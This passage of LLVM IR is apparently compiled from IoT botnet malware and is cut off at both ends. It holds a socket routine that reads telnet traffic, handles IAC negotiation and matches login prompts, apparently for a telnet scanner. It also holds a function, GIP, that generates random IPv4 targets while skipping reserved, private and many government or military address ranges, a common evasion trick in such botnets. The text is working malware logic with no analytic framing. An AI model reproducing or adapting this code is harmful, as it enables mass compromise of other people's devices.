.lr.ph77.preheader:                               ; preds = %.lr.ph.split.preheader
  br label %.lr.ph77

.lr.ph.split.us.preheader:                        ; preds = %.lr.ph
  br i1 %28, label %.lr.ph67.preheader, label %.critedge

.lr.ph67.preheader:                               ; preds = %.lr.ph.split.us.preheader
  br label %.lr.ph67

.lr.ph67:                                         ; preds = %.lr.ph67.preheader, %.backedge.us..lr.ph.split.us_crit_edge
  %.03335.us66 = phi i32 [ %40, %.backedge.us..lr.ph.split.us_crit_edge ], [ %7, %.lr.ph67.preheader ]
  %29 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %17) #6, !srcloc !25
  %30 = load i64, i64* %23, align 8
  %31 = or i64 %30, %20
  store i64 %31, i64* %23, align 8
  %32 = call i32 @select(i32 %24, %struct.fd_set* nonnull %9, %struct.fd_set* null, %struct.fd_set* null, %struct.timeval* nonnull %10) #6
  %33 = icmp slt i32 %32, 1
  br i1 %33, label %.critedge.loopexit, label %34

; <label>:34:                                     ; preds = %.lr.ph67
  %35 = sext i32 %.03335.us66 to i64
  %36 = getelementptr inbounds i8, i8* %5, i64 %35
  %37 = call i64 @recv(i32 %0, i8* %36, i64 1, i32 0) #6
  %38 = trunc i64 %37 to i32
  switch i32 %38, label %39 [
    i32 -1, label %.critedge.loopexit
    i32 0, label %.critedge.loopexit
  ]

; <label>:39:                                     ; preds = %34
  %40 = add nsw i32 %38, %.03335.us66
  %41 = load i8, i8* %36, align 1
  %42 = icmp eq i8 %41, -1
  br i1 %42, label %.us-lcssa.us.loopexit, label %43

; <label>:43:                                     ; preds = %39
  %44 = call i8* @strstr(i8* nonnull %5, i8* %1) #14
  %45 = icmp eq i8* %44, null
  br i1 %45, label %.backedge.us, label %.critedge.loopexit

.backedge.us:                                     ; preds = %43
  %46 = add nsw i32 %40, 2
  %47 = icmp slt i32 %46, %6
  br i1 %47, label %.backedge.us..lr.ph.split.us_crit_edge, label %.critedge.loopexit

.backedge.us..lr.ph.split.us_crit_edge:           ; preds = %.backedge.us
  %.pre54 = load i64, i64* %12, align 8
  %.pre55 = load i64, i64* %14, align 8
  %48 = icmp sgt i64 %.pre54, 0
  %49 = icmp sgt i64 %.pre55, 0
  %50 = or i1 %48, %49
  br i1 %50, label %.lr.ph67, label %.critedge.loopexit

.lr.ph77:                                         ; preds = %.lr.ph77.preheader, %.backedge..lr.ph.split_crit_edge
  %.0333576 = phi i32 [ %62, %.backedge..lr.ph.split_crit_edge ], [ %7, %.lr.ph77.preheader ]
  %51 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %17) #6, !srcloc !25
  %52 = load i64, i64* %23, align 8
  %53 = or i64 %52, %20
  store i64 %53, i64* %23, align 8
  %54 = call i32 @select(i32 %24, %struct.fd_set* nonnull %9, %struct.fd_set* null, %struct.fd_set* null, %struct.timeval* nonnull %10) #6
  %55 = icmp slt i32 %54, 1
  br i1 %55, label %.critedge.loopexit89, label %56

; <label>:56:                                     ; preds = %.lr.ph77
  %57 = sext i32 %.0333576 to i64
  %58 = getelementptr inbounds i8, i8* %5, i64 %57
  %59 = call i64 @recv(i32 %0, i8* %58, i64 1, i32 0) #6
  %60 = trunc i64 %59 to i32
  switch i32 %60, label %61 [
    i32 -1, label %.critedge.loopexit89
    i32 0, label %.critedge.loopexit89
  ]

; <label>:61:                                     ; preds = %56
  %62 = add nsw i32 %60, %.0333576
  %63 = load i8, i8* %58, align 1
  %64 = icmp eq i8 %63, -1
  br i1 %64, label %.us-lcssa.us.loopexit91, label %70

.us-lcssa.us.loopexit:                            ; preds = %39
  br label %.us-lcssa.us

.us-lcssa.us.loopexit91:                          ; preds = %61
  br label %.us-lcssa.us

.us-lcssa.us:                                     ; preds = %.us-lcssa.us.loopexit91, %.us-lcssa.us.loopexit
  %.lcssa = phi i8* [ %36, %.us-lcssa.us.loopexit ], [ %58, %.us-lcssa.us.loopexit91 ]
  %65 = getelementptr inbounds i8, i8* %.lcssa, i64 1
  %66 = call i64 @recv(i32 %0, i8* %65, i64 2, i32 0) #6
  %67 = trunc i64 %66 to i32
  switch i32 %67, label %68 [
    i32 -1, label %.critedge
    i32 0, label %.critedge
  ]

; <label>:68:                                     ; preds = %.us-lcssa.us
  %69 = call i32 @negotiate(i32 %0, i8* nonnull %.lcssa, i32 undef)
  br label %.critedge

; <label>:70:                                     ; preds = %61
  %71 = call i8* @strstr(i8* nonnull %5, i8* %1) #14
  %72 = icmp eq i8* %71, null
  br i1 %72, label %78, label %.critedge.loopexit89

.backedge:                                        ; preds = %78
  %73 = add nsw i32 %62, 2
  %74 = icmp slt i32 %73, %6
  br i1 %74, label %.backedge..lr.ph.split_crit_edge, label %.critedge.loopexit89

.backedge..lr.ph.split_crit_edge:                 ; preds = %.backedge
  %.pre = load i64, i64* %12, align 8
  %.pre53 = load i64, i64* %14, align 8
  %75 = icmp sgt i64 %.pre, 0
  %76 = icmp sgt i64 %.pre53, 0
  %77 = or i1 %75, %76
  br i1 %77, label %.lr.ph77, label %.critedge.loopexit89

; <label>:78:                                     ; preds = %70
  %79 = call i32 @matchPrompt(i8* nonnull %5)
  %80 = icmp eq i32 %79, 0
  br i1 %80, label %.backedge, label %.critedge.loopexit89

.critedge.loopexit:                               ; preds = %34, %34, %43, %.lr.ph67, %.backedge.us..lr.ph.split.us_crit_edge, %.backedge.us
  %.0.ph = phi i32 [ 0, %34 ], [ 0, %34 ], [ 1, %43 ], [ 0, %.lr.ph67 ], [ 0, %.backedge.us..lr.ph.split.us_crit_edge ], [ 0, %.backedge.us ]
  br label %.critedge

.critedge.loopexit89:                             ; preds = %56, %56, %70, %78, %.lr.ph77, %.backedge..lr.ph.split_crit_edge, %.backedge
  %.0.ph90 = phi i32 [ 0, %56 ], [ 0, %56 ], [ 1, %70 ], [ 1, %78 ], [ 0, %.lr.ph77 ], [ 0, %.backedge..lr.ph.split_crit_edge ], [ 0, %.backedge ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit89, %.critedge.loopexit, %.lr.ph.split.preheader, %.lr.ph.split.us.preheader, %8, %.us-lcssa.us, %.us-lcssa.us, %68
  %.0 = phi i32 [ 0, %68 ], [ 0, %.us-lcssa.us ], [ 0, %.us-lcssa.us ], [ 0, %8 ], [ 0, %.lr.ph.split.us.preheader ], [ 0, %.lr.ph.split.preheader ], [ %.0.ph, %.critedge.loopexit ], [ %.0.ph90, %.critedge.loopexit89 ]
  ret i32 %.0
}

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8* nocapture) local_unnamed_addr #8

; Function Attrs: noinline nounwind uwtable
define i32 @GIP() local_unnamed_addr #1 {
  %1 = alloca [16 x i8], align 16
  br label %.critedge

.critedge:                                        ; preds = %.critedge.backedge, %0
  %2 = tail call i32 @rand() #6
  %3 = srem i32 %2, 223
  %4 = trunc i32 %3 to i8
  store i8 %4, i8* @GIP.ipState.0, align 1
  %5 = tail call i32 @rand() #6
  %6 = srem i32 %5, 255
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* @GIP.ipState.1, align 1
  %8 = tail call i32 @rand() #6
  %9 = srem i32 %8, 255
  %10 = trunc i32 %9 to i8
  store i8 %10, i8* @GIP.ipState.2, align 1
  %11 = tail call i32 @rand() #6
  %12 = srem i32 %11, 255
  %13 = trunc i32 %12 to i8
  store i8 %13, i8* @GIP.ipState.3, align 1
  %14 = load i8, i8* @GIP.ipState.0, align 1
  switch i8 %14, label %.critedge._crit_edge [
    i8 127, label %.critedge.backedge
    i8 0, label %.critedge.backedge
    i8 3, label %.critedge.backedge
    i8 15, label %.critedge.backedge
    i8 56, label %.critedge.backedge
    i8 10, label %.critedge.backedge
    i8 25, label %.critedge.backedge
    i8 49, label %.critedge.backedge
    i8 50, label %.critedge.backedge
    i8 -119, label %.critedge.backedge
    i8 6, label %.critedge.backedge
    i8 7, label %.critedge.backedge
    i8 11, label %.critedge.backedge
    i8 21, label %.critedge.backedge
    i8 22, label %.critedge.backedge
    i8 26, label %.critedge.backedge
    i8 28, label %.critedge.backedge
    i8 29, label %.critedge.backedge
    i8 30, label %.critedge.backedge
    i8 33, label %.critedge.backedge
    i8 55, label %.critedge.backedge
    i8 -42, label %.critedge.backedge
    i8 -41, label %.critedge.backedge
    i8 -64, label %15
  ]

.critedge.backedge:                               ; preds = %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %15, %18, %25, %28, %31, %36, %43, %47, %51, %54, %57, %62, %65, %68, %71, %76, %79, %82, %85, %88, %92, %95, %104, %thread-pre-split, %117, %119, %121, %124, %130, %132, %134, %136, %138, %140, %142, %150, %.thread621, %159, %163, %167, %171, %181, %184, %187, %193, %197, %200, %202, %.thread862, %210, %213, %216, %219, %222, %227, %236, %243, %250, %256, %261, %265, %270, %274, %278, %281, %286, %292, %297, %303, %311, %316, %319, %323, %.thread1059, %334, %342, %347, %351, %354, %360, %365, %370, %375, %383, %386, %389, %392, %395, %398, %402, %407, %412, %417, %421, %427, %432, %436, %440, %444, %449, %453, %458, %462, %468, %475, %479, %481, %485, %thread-pre-split663, %500, %502, %504, %506, %511, %thread-pre-split671, %515, %521, %98, %109, %thread-pre-split612, %thread-pre-split640, %230, %239, %464, %493, %518, %126, %128, %.thread621.thread, %thread-pre-split627, %175, %thread-pre-split642, %thread-pre-split649, %thread-pre-split651, %245, %337, %.thread947, %378, %414, %.thread990, %471, %483, %487, %496, %491, %509, %489, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test
  br label %.critedge

.critedge._crit_edge:                             ; preds = %.critedge
  %.pre = load i8, i8* @GIP.ipState.1, align 1
  br label %18

; <label>:15:                                     ; preds = %.critedge
  %16 = load i8, i8* @GIP.ipState.1, align 1
  %17 = icmp eq i8 %16, -88
  br i1 %17, label %.critedge.backedge, label %18

; <label>:18:                                     ; preds = %.critedge._crit_edge, %15
  %19 = phi i8 [ %.pre, %.critedge._crit_edge ], [ %16, %15 ]
  %20 = icmp eq i8 %14, -110
  %21 = icmp eq i8 %19, 17
  %22 = icmp eq i8 %19, 80
  %or.cond222703 = or i1 %21, %22
  %23 = icmp eq i8 %19, 98
  %or.cond224704 = or i1 %23, %or.cond222703
  %24 = icmp eq i8 %19, -102
  %or.cond226705 = or i1 %24, %or.cond224704
  %or.cond678 = and i1 %20, %or.cond226705
  br i1 %or.cond678, label %.critedge.backedge, label %25

; <label>:25:                                     ; preds = %18
  %26 = icmp eq i8 %14, -109
  %27 = icmp eq i8 %19, -97
  %or.cond228 = and i1 %26, %27
  br i1 %or.cond228, label %.critedge.backedge, label %28

; <label>:28:                                     ; preds = %25
  %29 = icmp eq i8 %14, -108
  %30 = icmp eq i8 %19, 114
  %or.cond230 = and i1 %29, %30
  br i1 %or.cond230, label %.critedge.backedge, label %31

; <label>:31:                                     ; preds = %28
  %32 = icmp eq i8 %14, -106
  %33 = icmp eq i8 %19, 125
  %34 = icmp eq i8 %19, -123
  %or.cond234706 = or i1 %33, %34
  %35 = icmp eq i8 %19, -112
  %or.cond236707 = or i1 %35, %or.cond234706
  %or.cond680 = and i1 %32, %or.cond236707
  br i1 %or.cond680, label %.critedge.backedge, label %36

; <label>:36:                                     ; preds = %31
  %37 = icmp eq i8 %19, -107
  %38 = or i8 %19, 8
  %39 = icmp eq i8 %38, -99
  %40 = icmp eq i8 %19, -72
  %or.cond242709 = or i1 %40, %39
  %41 = icmp eq i8 %19, -66
  %or.cond244710 = or i1 %41, %or.cond242709
  %42 = icmp eq i8 %19, -60
  %or.cond246711 = or i1 %42, %or.cond244710
  %or.cond684 = and i1 %32, %or.cond246711
  br i1 %or.cond684, label %.critedge.backedge, label %43

; <label>:43:                                     ; preds = %36
  %44 = icmp eq i8 %14, -104
  %45 = icmp eq i8 %19, 82
  %46 = icmp eq i8 %19, -27
  %or.cond250712 = or i1 %45, %46
  %or.cond685 = and i1 %44, %or.cond250712
  br i1 %or.cond685, label %.critedge.backedge, label %47

; <label>:47:                                     ; preds = %43
  %48 = icmp eq i8 %14, -99
  %49 = icmp eq i8 %19, -54
  %50 = icmp eq i8 %19, -39
  %or.cond254713 = or i1 %49, %50
  %or.cond686 = and i1 %48, %or.cond254713
  br i1 %or.cond686, label %.critedge.backedge, label %51

; <label>:51:                                     ; preds = %47
  %52 = icmp eq i8 %14, -95
  %53 = icmp eq i8 %19, 124
  %or.cond256 = and i1 %52, %53
  br i1 %or.cond256, label %.critedge.backedge, label %54

; <label>:54:                                     ; preds = %51
  %55 = icmp eq i8 %14, -94
  %56 = icmp eq i8 %19, 32
  %or.cond258 = and i1 %55, %56
  br i1 %or.cond258, label %.critedge.backedge, label %57

; <label>:57:                                     ; preds = %54
  %58 = icmp eq i8 %14, -101
  %59 = icmp eq i8 %19, 96
  %or.cond262714 = or i1 %59, %37
  %60 = icmp eq i8 %19, -101
  %or.cond264715 = or i1 %60, %or.cond262714
  %61 = icmp eq i8 %19, -78
  %or.cond266716 = or i1 %61, %or.cond264715
  %or.cond689 = and i1 %58, %or.cond266716
  br i1 %or.cond689, label %.critedge.backedge, label %62

; <label>:62:                                     ; preds = %57
  %63 = icmp eq i8 %14, -92
  %64 = icmp eq i8 %19, -98
  %or.cond268 = and i1 %63, %64
  br i1 %or.cond268, label %.critedge.backedge, label %65

; <label>:65:                                     ; preds = %62
  %66 = icmp eq i8 %14, -100
  %67 = icmp eq i8 %19, 9
  %or.cond270 = and i1 %66, %67
  br i1 %or.cond270, label %.critedge.backedge, label %68

; <label>:68:                                     ; preds = %65
  %69 = icmp eq i8 %14, -89
  %70 = icmp eq i8 %19, 44
  %or.cond272 = and i1 %69, %70
  br i1 %or.cond272, label %.critedge.backedge, label %71

; <label>:71:                                     ; preds = %68
  %72 = icmp eq i8 %14, -88
  %73 = icmp eq i8 %19, 68
  %74 = icmp eq i8 %19, 85
  %or.cond276717 = or i1 %73, %74
  %75 = icmp eq i8 %19, 102
  %or.cond278718 = or i1 %75, %or.cond276717
  %or.cond691 = and i1 %72, %or.cond278718
  br i1 %or.cond691, label %.critedge.backedge, label %76

; <label>:76:                                     ; preds = %71
  %77 = icmp eq i8 %14, -53
  %78 = icmp eq i8 %19, 59
  %or.cond280 = and i1 %77, %78
  br i1 %or.cond280, label %.critedge.backedge, label %79

; <label>:79:                                     ; preds = %76
  %80 = icmp eq i8 %14, -52
  %81 = icmp eq i8 %19, 34
  %or.cond282 = and i1 %80, %81
  br i1 %or.cond282, label %.critedge.backedge, label %82

; <label>:82:                                     ; preds = %79
  %83 = icmp eq i8 %14, -49
  %84 = icmp eq i8 %19, 30
  %or.cond284 = and i1 %83, %84
  br i1 %or.cond284, label %.critedge.backedge, label %85

; <label>:85:                                     ; preds = %82
  %86 = icmp eq i8 %14, 117
  %.off = add i8 %19, -55
  %87 = icmp ult i8 %.off, 2
  %or.cond692 = and i1 %86, %87
  br i1 %or.cond692, label %.critedge.backedge, label %88

; <label>:88:                                     ; preds = %85
  %89 = icmp eq i8 %14, 80
  %90 = icmp eq i8 %19, -21
  %or.cond290 = and i1 %89, %90
  %91 = icmp eq i8 %19, 120
  %or.cond292 = and i1 %83, %91
  %or.cond693 = or i1 %or.cond290, %or.cond292
  br i1 %or.cond693, label %.critedge.backedge, label %92

; <label>:92:                                     ; preds = %88
  %93 = icmp eq i8 %14, -47
  %94 = icmp eq i8 %19, 35
  %or.cond294 = and i1 %93, %94
  br i1 %or.cond294, label %.critedge.backedge, label %95

; <label>:95:                                     ; preds = %92
  %96 = icmp eq i8 %14, 64
  %97 = icmp eq i8 %19, 70
  %or.cond296 = and i1 %96, %97
  br i1 %or.cond296, label %.critedge.backedge, label %98

; <label>:98:                                     ; preds = %95
  %99 = icmp eq i8 %14, -84
  %100 = and i8 %19, -16
  %101 = icmp eq i8 %100, 16
  %or.cond = and i1 %99, %101
  br i1 %or.cond, label %.critedge.backedge, label %102

; <label>:102:                                    ; preds = %98
  %103 = icmp eq i8 %14, 100
  br i1 %103, label %104, label %thread-pre-split

; <label>:104:                                    ; preds = %102
  %.off810 = add i8 %19, -64
  %105 = icmp ult i8 %.off810, 63
  br i1 %105, label %.critedge.backedge, label %.thread837

.thread837:                                       ; preds = %104
  %106 = and i8 %19, -2
  br label %113

thread-pre-split:                                 ; preds = %102
  %107 = icmp eq i8 %14, -87
  %108 = icmp eq i8 %19, -2
  %or.cond300 = and i1 %107, %108
  br i1 %or.cond300, label %.critedge.backedge, label %109

; <label>:109:                                    ; preds = %thread-pre-split
  %110 = icmp eq i8 %14, -58
  %111 = and i8 %19, -2
  %112 = icmp eq i8 %111, 18
  %or.cond814 = and i1 %110, %112
  br i1 %or.cond814, label %.critedge.backedge, label %113

; <label>:113:                                    ; preds = %.thread837, %109
  %114 = phi i8 [ %106, %.thread837 ], [ %111, %109 ]
  %115 = phi i1 [ false, %.thread837 ], [ %110, %109 ]
  %116 = phi i1 [ false, %.thread837 ], [ %107, %109 ]
  br i1 %96, label %117, label %thread-pre-split600

; <label>:117:                                    ; preds = %113
  %.off808 = add i8 %19, -69
  %118 = icmp ult i8 %.off808, -98
  br i1 %118, label %.critedge.backedge, label %thread-pre-split612

thread-pre-split600:                              ; preds = %113
  switch i8 %14, label %thread-pre-split612 [
    i8 -128, label %119
    i8 -127, label %121
    i8 -126, label %124
    i8 -125, label %126
    i8 -124, label %128
    i8 -122, label %130
    i8 -120, label %132
    i8 -118, label %134
    i8 -117, label %136
    i8 -116, label %138
    i8 -113, label %140
    i8 -112, label %142
  ]

; <label>:119:                                    ; preds = %thread-pre-split600
  %.off807 = add i8 %19, -35
  %120 = icmp ult i8 %.off807, -54
  br i1 %120, label %.critedge.backedge, label %thread-pre-split612

; <label>:121:                                    ; preds = %thread-pre-split600
  %122 = icmp ult i8 %19, 22
  %123 = icmp eq i8 %19, -1
  %or.cond304 = or i1 %122, %123
  br i1 %or.cond304, label %thread-pre-split612, label %.critedge.backedge

; <label>:124:                                    ; preds = %thread-pre-split600
  %.off806 = add i8 %19, -40
  %125 = icmp sgt i8 %.off806, -1
  br i1 %125, label %.critedge.backedge, label %thread-pre-split612

; <label>:126:                                    ; preds = %thread-pre-split600
  %switch.tableidx = add i8 %19, 5
  %127 = icmp ult i8 %switch.tableidx, 8
  br i1 %127, label %thread-pre-split612, label %.critedge.backedge

; <label>:128:                                    ; preds = %thread-pre-split600
  %switch.tableidx1095 = add i8 %19, 5
  %129 = icmp ult i8 %switch.tableidx1095, 8
  br i1 %129, label %thread-pre-split612, label %.critedge.backedge

; <label>:130:                                    ; preds = %thread-pre-split600
  %.off805 = add i8 %19, -5
  %131 = icmp ult i8 %.off805, -26
  br i1 %131, label %.critedge.backedge, label %thread-pre-split612

; <label>:132:                                    ; preds = %thread-pre-split600
  %.off804 = add i8 %19, 79
  %133 = icmp ult i8 %.off804, 46
  br i1 %133, label %.critedge.backedge, label %thread-pre-split612

; <label>:134:                                    ; preds = %thread-pre-split600
  %.off803 = add i8 %19, -13
  %135 = icmp ult i8 %.off803, -75
  br i1 %135, label %.critedge.backedge, label %thread-pre-split612

; <label>:136:                                    ; preds = %thread-pre-split600
  %.off802 = add i8 %19, -31
  %137 = icmp ult i8 %.off802, 112
  br i1 %137, label %.critedge.backedge, label %thread-pre-split612

; <label>:138:                                    ; preds = %thread-pre-split600
  %.off801 = add i8 %19, -1
  %139 = icmp ult i8 %.off801, -54
  br i1 %139, label %.critedge.backedge, label %thread-pre-split612.thread

; <label>:140:                                    ; preds = %thread-pre-split600
  %.off800 = add i8 %19, -45
  %141 = icmp ult i8 %.off800, -68
  br i1 %141, label %.critedge.backedge, label %thread-pre-split612.thread

; <label>:142:                                    ; preds = %thread-pre-split600
  %.off799 = add i8 %19, -99
  %143 = icmp ult i8 %.off799, -102
  br i1 %143, label %.critedge.backedge, label %thread-pre-split612.thread

thread-pre-split612:                              ; preds = %thread-pre-split600, %134, %132, %130, %124, %121, %119, %117, %126, %128, %136
  %144 = phi i1 [ false, %136 ], [ true, %134 ], [ false, %132 ], [ false, %130 ], [ false, %124 ], [ false, %121 ], [ false, %119 ], [ false, %117 ], [ false, %126 ], [ false, %128 ], [ false, %thread-pre-split600 ]
  %145 = phi i1 [ true, %136 ], [ false, %134 ], [ false, %132 ], [ false, %130 ], [ false, %124 ], [ false, %121 ], [ false, %119 ], [ false, %117 ], [ false, %126 ], [ false, %128 ], [ false, %thread-pre-split600 ]
  %146 = icmp eq i8 %19, -91
  %or.cond816 = and i1 %20, %146
  br i1 %or.cond816, label %.critedge.backedge, label %thread-pre-split612.thread

thread-pre-split612.thread:                       ; preds = %140, %138, %142, %thread-pre-split612
  %147 = phi i1 [ %146, %thread-pre-split612 ], [ false, %142 ], [ false, %138 ], [ false, %140 ]
  %148 = phi i1 [ %145, %thread-pre-split612 ], [ false, %142 ], [ false, %138 ], [ false, %140 ]
  %149 = phi i1 [ %144, %thread-pre-split612 ], [ false, %142 ], [ false, %138 ], [ false, %140 ]
  br i1 %26, label %150, label %.thread621.thread

; <label>:150:                                    ; preds = %thread-pre-split612.thread
  %.off795 = add i8 %19, -35
  %151 = icmp ult i8 %.off795, 8
  %.off796 = add i8 %19, -103
  %152 = icmp ult i8 %.off796, 2
  %or.cond1097 = or i1 %151, %152
  %153 = icmp eq i8 %114, -88
  %or.cond1098 = or i1 %or.cond1097, %153
  %154 = icmp eq i8 %114, -58
  %or.cond1099 = or i1 %or.cond1098, %154
  br i1 %or.cond1099, label %.critedge.backedge, label %.thread621

.thread621:                                       ; preds = %150
  %155 = icmp ult i8 %19, -18
  %156 = icmp eq i8 %19, -1
  %or.cond320 = or i1 %155, %156
  br i1 %or.cond320, label %.thread621.thread, label %.critedge.backedge

.thread621.thread:                                ; preds = %.thread621, %thread-pre-split612.thread
  %.off794 = add i8 %19, -113
  %157 = icmp ult i8 %.off794, 2
  %or.cond1101 = and i1 %32, %157
  br i1 %or.cond1101, label %.critedge.backedge, label %158

; <label>:158:                                    ; preds = %.thread621.thread
  br i1 %44, label %159, label %thread-pre-split627

; <label>:159:                                    ; preds = %158
  %.off793 = add i8 %19, 105
  %160 = icmp ult i8 %.off793, 4
  br i1 %160, label %.critedge.backedge, label %thread-pre-split627.thread

thread-pre-split627:                              ; preds = %158
  %161 = icmp eq i8 %14, -103
  %.off792 = add i8 %19, -21
  %162 = icmp ult i8 %.off792, 11
  %or.cond1103 = and i1 %161, %162
  br i1 %or.cond1103, label %.critedge.backedge, label %thread-pre-split627.thread

thread-pre-split627.thread:                       ; preds = %159, %thread-pre-split627
  br i1 %58, label %163, label %.thread631.thread

; <label>:163:                                    ; preds = %thread-pre-split627.thread
  %.off789 = add i8 %19, -5
  %164 = icmp ult i8 %.off789, 5
  %.off790 = add i8 %19, -74
  %165 = icmp ult i8 %.off790, 15
  %or.cond1105 = or i1 %164, %165
  %.off791 = add i8 %19, 43
  %166 = icmp ult i8 %.off791, 9
  %or.cond1107 = or i1 %or.cond1105, %166
  br i1 %or.cond1107, label %.critedge.backedge, label %.thread631.thread

.thread631.thread:                                ; preds = %163, %thread-pre-split627.thread
  br i1 %48, label %167, label %169

; <label>:167:                                    ; preds = %.thread631.thread
  %.off788 = add i8 %19, 106
  %168 = icmp ult i8 %.off788, 4
  br i1 %168, label %.critedge.backedge, label %thread-pre-split642

; <label>:169:                                    ; preds = %.thread631.thread
  %170 = icmp eq i8 %14, -98
  br i1 %170, label %171, label %thread-pre-split640

; <label>:171:                                    ; preds = %169
  %.off786 = add i8 %19, -1
  %172 = icmp ult i8 %.off786, 20
  %.off787 = add i8 %19, 21
  %173 = icmp ult i8 %.off787, 12
  %or.cond1109 = or i1 %172, %173
  br i1 %or.cond1109, label %.critedge.backedge, label %thread-pre-split642

thread-pre-split640:                              ; preds = %169
  %174 = icmp eq i8 %14, -97
  %or.cond818 = and i1 %174, %91
  br i1 %or.cond818, label %.critedge.backedge, label %175

; <label>:175:                                    ; preds = %thread-pre-split640
  %176 = icmp eq i8 %14, -96
  %.off785 = add i8 %19, 124
  %177 = icmp ult i8 %.off785, 19
  %or.cond1111 = and i1 %176, %177
  br i1 %or.cond1111, label %.critedge.backedge, label %thread-pre-split642

thread-pre-split642:                              ; preds = %167, %171, %175
  %178 = phi i1 [ %174, %175 ], [ false, %171 ], [ false, %167 ]
  %.off784 = add i8 %19, 32
  %179 = icmp ult i8 %.off784, 3
  %or.cond1113 = and i1 %96, %179
  br i1 %or.cond1113, label %.critedge.backedge, label %180

; <label>:180:                                    ; preds = %thread-pre-split642
  br i1 %55, label %181, label %thread-pre-split644

; <label>:181:                                    ; preds = %180
  %.off783 = add i8 %19, -45
  %182 = icmp ult i8 %.off783, 2
  br i1 %182, label %.critedge.backedge, label %thread-pre-split644.thread

thread-pre-split644:                              ; preds = %180
  %183 = icmp eq i8 %14, -93
  br i1 %183, label %184, label %thread-pre-split644.thread

; <label>:184:                                    ; preds = %thread-pre-split644
  %.off782 = add i8 %19, 51
  %185 = icmp ult i8 %.off782, 2
  br i1 %185, label %.critedge.backedge, label %thread-pre-split644.thread

thread-pre-split644.thread:                       ; preds = %181, %184, %thread-pre-split644
  %186 = phi i1 [ true, %184 ], [ false, %thread-pre-split644 ], [ false, %181 ]
  br i1 %63, label %187, label %thread-pre-split649

; <label>:187:                                    ; preds = %thread-pre-split644.thread
  %.off780 = add i8 %19, -45
  %188 = icmp ult i8 %.off780, 5
  %.off781 = add i8 %19, 39
  %189 = icmp ult i8 %.off781, 16
  %or.cond1115 = or i1 %188, %189
  %190 = icmp eq i8 %114, -4
  %or.cond1116 = and i1 %116, %190
  %or.cond1204 = or i1 %or.cond1115, %or.cond1116
  br i1 %or.cond1204, label %.critedge.backedge, label %191

thread-pre-split649:                              ; preds = %thread-pre-split644.thread
  %.old1203 = icmp eq i8 %114, -4
  %or.cond1116.old = and i1 %116, %.old1203
  br i1 %or.cond1116.old, label %.critedge.backedge, label %191

; <label>:191:                                    ; preds = %187, %thread-pre-split649
  %192 = icmp eq i8 %14, -57
  br i1 %192, label %193, label %thread-pre-split651

; <label>:193:                                    ; preds = %191
  %.off778 = add i8 %19, -121
  %194 = icmp ult i8 %.off778, -123
  br i1 %194, label %.critedge.backedge, label %thread-pre-split651.thread

thread-pre-split651:                              ; preds = %191
  %195 = icmp eq i8 %14, -51
  %.off777 = add i8 %19, -1
  %196 = icmp ult i8 %.off777, 117
  %or.cond1118 = and i1 %195, %196
  br i1 %or.cond1118, label %.critedge.backedge, label %thread-pre-split651.thread

thread-pre-split651.thread:                       ; preds = %193, %thread-pre-split651
  br i1 %83, label %197, label %thread-pre-split653

; <label>:197:                                    ; preds = %thread-pre-split651.thread
  %198 = icmp eq i8 %114, 60
  br i1 %198, label %.critedge.backedge, label %.thread862

thread-pre-split653:                              ; preds = %thread-pre-split651.thread
  %199 = icmp eq i8 %14, 104
  br i1 %199, label %200, label %202

; <label>:200:                                    ; preds = %thread-pre-split653
  %.off775 = add i8 %19, -16
  %201 = icmp ult i8 %.off775, 15
  br i1 %201, label %.critedge.backedge, label %.thread862

; <label>:202:                                    ; preds = %thread-pre-split653
  %203 = icmp eq i8 %14, -68
  %204 = icmp eq i8 %19, -90
  %205 = icmp eq i8 %19, -30
  %or.cond345720 = or i1 %204, %205
  %or.cond694 = and i1 %203, %or.cond345720
  br i1 %or.cond694, label %.critedge.backedge, label %.thread862

.thread862:                                       ; preds = %200, %197, %202
  %206 = phi i1 [ %203, %202 ], [ false, %197 ], [ false, %200 ]
  %207 = phi i1 [ false, %202 ], [ false, %197 ], [ true, %200 ]
  %208 = icmp eq i8 %19, -53
  %or.cond347 = and i1 %178, %208
  %209 = icmp eq i8 %19, -13
  %or.cond349 = and i1 %55, %209
  %or.cond1119 = or i1 %or.cond347, %or.cond349
  br i1 %or.cond1119, label %.critedge.backedge, label %210

; <label>:210:                                    ; preds = %.thread862
  %211 = icmp eq i8 %14, 45
  %212 = icmp eq i8 %19, 55
  %or.cond351 = and i1 %211, %212
  br i1 %or.cond351, label %.critedge.backedge, label %213

; <label>:213:                                    ; preds = %210
  %214 = icmp eq i8 %14, -78
  %215 = icmp eq i8 %19, 62
  %or.cond353 = and i1 %214, %215
  br i1 %or.cond353, label %.critedge.backedge, label %216

; <label>:216:                                    ; preds = %213
  %217 = icmp eq i8 %19, -125
  %218 = icmp eq i8 %19, -20
  %or.cond357721 = or i1 %217, %218
  %or.cond695 = and i1 %207, %or.cond357721
  br i1 %or.cond695, label %.critedge.backedge, label %219

; <label>:219:                                    ; preds = %216
  %220 = icmp eq i8 %14, 107
  %221 = icmp eq i8 %19, -86
  %or.cond359 = and i1 %220, %221
  br i1 %or.cond359, label %.critedge.backedge, label %222

; <label>:222:                                    ; preds = %219
  %223 = icmp eq i8 %19, -59
  %or.cond363722 = or i1 %223, %73
  %or.cond696 = and i1 %149, %or.cond363722
  %or.cond365 = and i1 %148, %78
  %or.cond1120 = or i1 %or.cond696, %or.cond365
  br i1 %or.cond1120, label %.critedge.backedge, label %224

; <label>:224:                                    ; preds = %222
  %225 = icmp eq i8 %19, -71
  %or.cond367 = and i1 %20, %225
  %226 = load i8, i8* @GIP.ipState.2, align 1
  br i1 %or.cond367, label %227, label %230

; <label>:227:                                    ; preds = %224
  %228 = icmp slt i8 %226, 0
  %229 = icmp ult i8 %226, -65
